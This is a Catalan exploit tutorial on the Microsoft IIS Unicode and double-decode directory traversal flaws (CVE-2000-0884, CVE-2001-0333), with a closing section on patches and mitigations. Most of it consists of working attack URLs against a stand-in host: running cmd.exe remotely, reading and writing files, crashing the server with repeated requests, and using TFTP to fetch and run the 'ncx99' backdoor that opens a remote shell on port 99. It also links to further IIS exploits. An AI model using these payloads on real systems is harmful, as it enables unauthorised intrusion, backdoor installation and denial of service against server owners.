@@ -1,0 +1,251 @@
+
+                             EL RACO DE L'EXPLOIT
+
+                           per Alex Castan Salinas
+                              alex.castan@upc.es
+
+                            *--------------------*
+                            |                    |
+                            |  El teu servidor   |
+                            |     es mort...     |
+                            | i abans estava viu |
+                            |     _______        |
+                            |    |.-----.|       |
+                            |    ||x . x||       |
+                            |    ||_.-._||       |
+                            |    `--)-(--'       |
+                            |   __[=== o]___     |
+                            |  |:::::::::::|\    |
+                            |  `-=========-'()   |
+                            |                    |
+                            | No hauries d'haver |
+                            |    instal.lat :    |
+                            |                    |
+                            | -= Mocosoft IIS =- |
+                            *--------------------*
+
+
+
+Vulnerabilitat: travessa de directoris a Microsoft IIS.
+
+Afecta a: Windows NT Server 4.0 amb IIS 4 i Windows NT Server 2000 amb IIS 5.
+No afecta a: Windows 9x i Windows NT sense IIS.
+
+CVE-2000-0884 i CVE-2001-0333.
+A Microsoft Internet Information Server (IIS), una analisi incorrecta dels
+caracters unicode a l'adreca de la pagina (URL) sol.licitada permet travessar
+les carpetes del servidor i executar comandes arbitraries dins aquest.
+
+
+
+INTRODUCCIO
+-----------
+Code Red, Code Red II, Blue Code, Nimda, ... son alguns dels ultims cucs que
+s'han propagat per tota Internet aprofitant vulnerabilitats descobertes d'enca
+fa mesos a Microsoft Internet Information Server. Microsoft Internet
+Information Server (a partir d'ara l'anomenarem IIS) son els servidors de web,
+ftp i gopher que s'instal.len per defecte amb Microsoft Windows NT server 4.0
+(IIS 3.0 i 4.0) i 2000 (IIS 5.0). Des del seu naixement, IIS ha estat un sac
+ple de forats. Continuament s'han descobert vulnerabilitats, i a quina mes
+greu. Com que actualment hi ha uns sis milions de servidors IIS al mon, ja us
+podeu fer una idea de la magnitud de la tragedia.
+
+A les seguents linies descriure dues de les vulnerabilitats que han emprat
+alguns d'aquests cucs i que son facilment explotables, permetent travessar les
+carpetes del servidor de pagines web i l'execucio de comandes i programes dins
+aquest amb privilegis de l'usuari IUSR_NomMaquina.
+
+
+
+VULNERABILITAT
+--------------
+Suposem que tenim un servidor web amb IIS al qual volem executar una comanda
+des del nostre navegador (per exemple, veure els fitxers del seu directori
+arrel). Suposant que existeix la carpeta 'scripts' i la
+carpeta'/winnt/system32' amb la comanda 'cmd.exe', podem intentar travessar la
+carpeta de CGIs amb:
+
+http://www.victima.com/scripts/../../winnt/system32/cmd.exe?/c+dir+c:\
+
+   www.victima.com es el servidor NT amb IIS vulnerable
+
+   /scripts/ es un directori on el servidor te privilegis d'execucio i que
+   hauria d'emprar-se per  executar scripts CGI. Si aquesta carpeta no
+   existeix, proveu amb /msadc/, /_vti_bin/, /PBServer/, /Rpc/ o alguna altra
+   (busqueu algun enllac que cridi algun CGI del servidor). Tingueu en compte
+   que segons la carpeta que poseu, haureu d'incloure mes o menys sequencies
+   '../'. Tingueu en compte tambe que no tots els servidors IIS tenen aquest
+   directori executable.
+
+   ../ i ..\ son sequencies per travessar d'un directori a l'anterior.
+
+   winnt/system32/ es el directori al que volem accedir
+
+   cmd.exe es un programa que permet executar una comanda de windows NT (ren,
+   call, copy, move, del, path, ...). Podeu provar tambe altres programes com:
+   ping, netstat, tftp, ...
+
+   ? significa arguments per al CGI. Aixi, a l'exemple anterior '/c', 'dir' i
+   'c:\' son els arguments. Enlloc de separar-los per espais, els separem per
+   '+'.
+
+"Error XXX de HTTP". La peticio anterior falla perque el servidor filtra
+alguns caracters / i \ d'aquest tipus de peticions. Tot caracter, pero, es pot
+codificar a la URL mitjancant el seu equivalent unicode. Unicode proporciona
+un nombre unic per a cada caracter, sense importar la plataforma, programa i
+llenguatge. Els equivalents en unicode de / i \ son %2f i %5c. Amb aixo
+convertim la peticio anterior en:
+
+http://www.victima.com/scripts/..%2f..%2fwinnt/system32/cmd.exe?/c+dir+c:\
+
+"Error XXX de HTTP". Falla perque el servidor converteix els caracters unicode
+a caracters normals i despres filtra alguns caracters / i \ d'aquest tipus de
+peticions. Podem, pero, codificar els caracters a unicode fent servir una
+sequencia "llarga", que no es mes que una representacio unicode invalida per
+ser mes gran que la sequencia actualment requerida per representar el
+caracter. Un possible equivalent de / en unicode sequencia llarga es %c0%af.
+Amb aixo convertim la peticio anterior en:
+
+http://www.victima.com/scripts/..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\
+
+Bingo! A menys que tingui instal.lat el pegat contra aquesta vulnerabilitat,
+IIS  no realitza una comprovacio de seguretat de sequencies unicode llargues.
+Pero aixo no es tot. Pot ser que si tingui instal.lat el pegat i l'anterior
+peticio no hi hagi funcionat. No importa, encara hi ha mes. Una altra
+vulnerabilitat a IIS fa que aquest descodifiqui les adreces dos cops.
+M'explico: quan IIS processa una peticio d'un programa CGI, primer descodifica
+el nom del programa per comprovar si aquest es un fitxer executable, i despres
+descodifica tot de nou, tant els parametres com el nom del programa. Aixi el
+nom del programa queda descodificat dos cops. Suposem que \ codifica com %5c,
+ara tornem a codificar algun dels caracters que formen %5c: % = %25, 5 = %35 i
+c = %63. Obtenim set combinacions, totes valides: %255c, %%35c, %5%63,
+%25%35c, %255%63, %%35%63 i %25%35%63. Escollim una d'elles i la nostra
+peticio queda:
+
+http://www.victima.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+
+Bingo de nou!  A menys que tingui instal.lat el pegat contra aquesta altra
+vulnerabilitat.
+
+
+
+COM EXPLOTAR LA VULNERABILITAT
+------------------------------
+Com hem vist abans, podem executar remotament comandes de Windows NT, amb
+visualitzacio al nostre navegador del resultat. Aixo ens dona moltes
+possibilitats:
+
+(1) Accedir a informacio del servidor.
+
+    Llistar directoris:
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+
+    Veure fitxers de text:
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+type+nomfitxer
+
+    Redireccionar la sortida de les comandes a un fitxer dins el servidor. Com
+    en un principi cmd.exe esta protegit per IIS contra redireccionament de la
+    sortida, primer l'haurem de copiar a un altre fitxer o directori:
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+copy+c:\winnt\system32\cmd.exe+c:\inetpub\scripts\cmd1.exe
+
+    A continuacio ja el podem fer servir, per exemple redireccionem les linies
+    "abd" i "def" (%0d es el caracter de retorn) al fitxer 'aaa', llistem el
+    directori i el contingut del fitxer 'aaa' (& separa comandes):
+
+    http://www.victima.com/scripts/cmd1.exe?/c+echo+abc%0ddef+>aaa&dir&type+aaa
+
+    Si el directori scripts no existeix, podeu provar els seguents:
+
+    http://www.victima.com/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+    http://www.victima.com/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+    http://www.victima.com/_vti_bin/..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+    http://www.victima.com/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+    http://www.victima.com/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\
+
+(2) Atac de denegacio de servei.
+
+    Intentar establir el maxim nombre de connexions possibles, tal que ningu
+    mes pugui accedir el servidor. Per exemple, repetint 15 o mes cops (amb el
+    boto 'actualitzar' del navegador) la seguent comanda, hauria de penjar el
+    servidor. Comproveu si s'ha penjat prement majuscules alhora que el boto
+    d'actualitzar.
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+comp
+
+(3) Transferir fitxers del servidor al vostre ordinador i del vostre ordinador
+    cap el servidor.
+
+    Podeu fer servir el protocol 'Trivial FTP' (TFTP) per transferir fitxers
+    del servidor cap al vostre ordinador i del vostre ordinador cap el
+    servidor. TFTP es un protocol molt mes senzill que FTP i nomes te dues
+    comandes: GET (baixar fitxer) i PUT (pujar fitxer). TFTP es un client de
+    TFTP que ve amb Windows NT 4.0 i 2000, que permet connectar-se a un
+    servidor de TFTP. En el seguent exemple puja el troia 'ncx99' des de
+    l'ordinador xxx.xxx.xxx.xxx cap al servidor, per executar-lo a continuacio
+    ('ncx99' obre una sessio de comandes al port 99).
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/tftp.exe+"-i"+xxx.xxx.xxx.xxx+GET+ncx99.exe+c:\winnt\system32\ncx99.exe
+
+    http://www.victima.com/scripts/..%255c..%255cwinnt/system32/ncx99.exe
+
+    telnet://www.victima.com:99/
+    
+    Trobareu servidors gratuits de TFTP per instal.lar als vostres equips a:
+    - Tftpd32 free TFTP server: http://membres.tripod.fr/phjounin/P_tftpd32.htm
+    - Solarwinds' Free TFTP Server: http://www.solarwinds.net/
+
+
+
+EL PEGAT
+--------
+Tenim varies solucions per aquesta vulnerabilitat:
+
+ * Microsoft ha tret un pegat acumulatiu per aquestes i d'altres
+   vulnerabilitats, que trobareu a:
+   http://www.microsoft.com/technet/security/bulletin/MS01-044.asp
+
+ * L'eina 'Lockdown' de Microsoft permet als administradors bloquejar un
+   servidor IIS. La trobareu a:
+   http://www.microsoft.com/technet/security/tools/locktool.asp.
+
+ * L'eina 'URLScan' permet filtrar peticions HTTP. La trobareu a:
+   http://www.microsoft.com/technet/security/URLScan.asp.
+
+ * Si no necessitem scripts CGI, esborrar el directori virtual d'aquests
+   executables (per exemple, la carpeta scripts). Si els necessitem, emprem un
+   disc dur local separat per aquesta carpeta.
+
+ * Moure totes les utilitats de linia de comandes que podria emprar un atacant
+   a un altre directori, i elimineu els permisos de l'usuari 'convidat' a
+   aquestes  utilitats.
+
+
+
+ALTRES VULNERABILITATS
+----------------------
+A continuacio, un parell de vulnerabilitats mes que us permetran obtenir
+'root' remot.
+
+(1) ISAPI Extension buffer overflows. CVE-1999-0412 i CVE-2001-0241.
+
+    Exploit per Indexing Service (IDA) buffer overflow:
+    http://www.securiteam.com/exploits/5GP0C2K4KK.html
+
+    Exploit per .printer buffer overflow:
+    http://www.securiteam.com/exploits/5TP0C004AS.html
+    http://www.securiteam.com/exploits/5MP010U4AW.html
+  
+    Pegat: http://www.microsoft.com/technet/security/bulletin/MS01-044.asp
+
+(2) IIS RDS exploit (Microsoft Remote data Services). CVE-1999-1011.
+
+    Guia de la vulnerabilitat i com corregir-la:
+    http://www.wiretrip.net/rfp/p/doc.asp?id=29&iface=2
+
+    Pegat: no existeix un pegat per aquesta vulnerabilitat, pero podeu
+    prevenir el problema actualitzant a una versio de MDAC superior a la 2.1:
+    http://www.microsoft.com/data/download.htm
+
